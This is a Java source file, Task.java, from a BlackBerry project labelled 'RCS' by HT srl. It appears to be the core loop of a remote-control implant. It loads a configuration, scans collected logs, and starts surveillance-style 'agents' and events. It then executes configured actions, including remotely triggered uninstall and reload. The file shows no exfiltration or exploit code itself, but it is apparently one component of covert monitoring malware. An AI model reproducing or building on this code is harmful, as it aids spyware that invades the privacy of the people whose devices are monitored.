/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Task.java
 * Created      : 26-mar-2010
 * *************************************************/

package blackberry;

import java.util.Timer;
import java.util.Vector;

import net.rim.device.api.system.DeviceInfo;
import blackberry.action.Action;
import blackberry.action.SubAction;
import blackberry.interfaces.Singleton;
import blackberry.log.LogCollector;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class Task.
 */
public final class Task implements Singleton {

    private static final int SLEEPING_TIME = 1000;
    private static final long APP_TIMER_PERIOD = 2000;

    /** The debug instance. */
    // #debug
    private static Debug debug = new Debug("Task", DebugLevel.VERBOSE);

    /**
     * Gets the single instance of Task.
     * 
     * @return single instance of Task
     */
    public static synchronized Task getInstance() {
        if (instance == null) {
            instance = new Task();
        }
        return instance;
    }

    /** The conf. */
    Conf conf;

    /** The status. */
    Status status;

    /** The device. */
    Device device;

    /** The log collector. */
    LogCollector logCollector;

    /** The event manager. */
    EventManager eventManager;

    /** The agent manager. */
    AgentManager agentManager;
    Timer applicationTimer;

    // ApplicationUpdateTask();

    AppUpdateManager appUpdateManager;

    private static Task instance;

    /**
     * Instantiates a new task.
     */
    private Task() {
        status = Status.getInstance();
        device = Device.getInstance();
        logCollector = LogCollector.getInstance();

        eventManager = EventManager.getInstance();
        agentManager = AgentManager.getInstance();

        // #debug debug
        debug.trace("Task created");
    }

    /**
     * Check actions.
     * 
     * @return true, if successful
     */
    public boolean checkActions() {
        Utils.sleep(1000);

        for (;;) {
            // #debug debug
            // debug.trace("checkActions");
            final int[] actionIds = status.getActionIdTriggered();

            final int asize = actionIds.length;
            if (asize > 0) {

                for (int k = 0; k < asize; ++k) {
                    final int actionId = actionIds[k];
                    final Action action = status.getAction(actionId);

                    if (action.isTriggered() == false) {
                        // #debug
                        debug.warn("Should be triggered");
                        continue;
                    }

                    // #debug debug
                    debug.trace("CheckActions() triggered" + action);
                    action.setTriggered(false, null);

                    final Vector subActions = action.getSubActionsList();

                    final int ssize = subActions.size();
                    for (int j = 0; j < ssize; ++j) {

                        final SubAction subAction = (SubAction) subActions
                                .elementAt(j);
                        final boolean ret = subAction.execute(action
                                .getTriggeringEvent());

                        if (ret == false) {
                            // #debug
                            debug.warn("CheckActions() error executing: "
                                    + subAction);
                            break;
                        }

                        if (subAction.wantUninstall()) {
                            // #debug
                            debug.warn("CheckActions() uninstalling");
                            agentManager.stopAll();
                            eventManager.stopAll();
                            return false;
                        }

                        if (subAction.wantReload()) {
                            // #debug
                            debug.warn("CheckActions() reloading");
                            agentManager.stopAll();
                            eventManager.stopAll();
                            return true;
                        }
                    }
                }
            }
            Utils.sleep(SLEEPING_TIME);
        }
    }

    /**
     * Start application timer.
     */
    synchronized void startApplicationTimer() {
        // #debug debug
        debug.trace("startApplicationTimer");

        if (applicationTimer != null) {
            applicationTimer.cancel();
            applicationTimer = null;
            appUpdateManager = null;
        }

        applicationTimer = new Timer();
        appUpdateManager = new AppUpdateManager();
        applicationTimer.schedule(appUpdateManager, APP_TIMER_PERIOD,
                APP_TIMER_PERIOD);
    }

    /**
     * Stop application timer.
     */
    synchronized void stopApplicationTimer() {
        // #debug debug
        debug.trace("stopApplicationTimer");
        if (applicationTimer != null) {
            applicationTimer.cancel();
            applicationTimer = null;
            appUpdateManager = null;
        }
    }

    /**
     * Task init.
     * 
     * @return true, if successful
     */
    public boolean taskInit() {
        // #debug debug
        debug.trace("TaskInit");

        agentManager.stopAll();
        eventManager.stopAll();

        if (device != null) {
            device.refreshData();
        }

        conf = new Conf();

        if (conf.load() == false) {
            // #debug debug
            debug.trace("TaskInit - Load Conf FAILED");

            return false;
        }

        Msg.demo("Configuration... OK\n");

        if (logCollector != null) {
            logCollector.scanLogs();
        }

        // Da qui in poi inizia la concorrenza dei thread

        if (eventManager.startAll() == false) {
            // #debug debug
            debug.trace("TaskInit - eventManager FAILED");
            return false;
        }

        // #debug info
        debug.info("TaskInit - agents started");

        if (agentManager.startAll() == false) {
            // #debug debug
            debug.trace("TaskInit - agentManager FAILED");
            return false;
        }

        if (!DeviceInfo.isInHolster()) {
            // #debug debug
            debug.trace("going to start ApplicationTimer");
            startApplicationTimer();
        }

        // #debug info
        debug.info("TaskInit - agents started");
        return true;
    }
}
